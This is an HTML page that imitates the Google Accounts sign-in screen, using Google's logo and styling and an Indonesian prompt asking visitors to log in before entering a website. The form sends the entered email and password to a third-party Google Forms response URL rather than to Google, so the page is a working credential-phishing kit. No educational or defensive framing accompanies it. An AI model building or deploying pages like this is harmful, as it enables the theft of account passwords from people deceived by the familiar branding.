<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f7f8f8; margin: 0; }
        .login-box { background: white; border: 1px solid #dadce0; border-radius: 8px; width: 360px; padding: 40px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; margin-bottom: 25px; color: #202124; }
        input[type="text"], input[type="password"] { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
        .footer-text { clear: both; padding-top: 40px; font-size: 12px; color: #70757a; text-align: left; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="google-logo">
        <h1>Sign in</h1>
        <p>Harap login ke akun google sebelum masuk ke website</p>
        
        <form action="https://docs.google.com/forms/d/e/1FAIpQLScrfc6rFhhgQPNUaNC7HVrT8iA_dDMX4DJUWxBw9ojEVa7nhQ/formResponse" method="POST">
            <input type="text" name="entry.123456789" placeholder="Email or phone" required>
            <input type="password" name="entry.987654321" placeholder="Enter your password" required>
            
            <div style="margin-top: 20px;">
                <span style="color: #1a73e8; font-size: 14px; font-weight: 500; float: left; cursor: pointer; margin-top: 10px;">Forgot email?</span>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>

        <div class="footer-text">
            Not your computer? Use Guest mode to sign in privately. <br>
            <span style="color: #1a73e8; cursor: pointer;">Learn more</span>
        </div>
    </div>
</body>
</html>
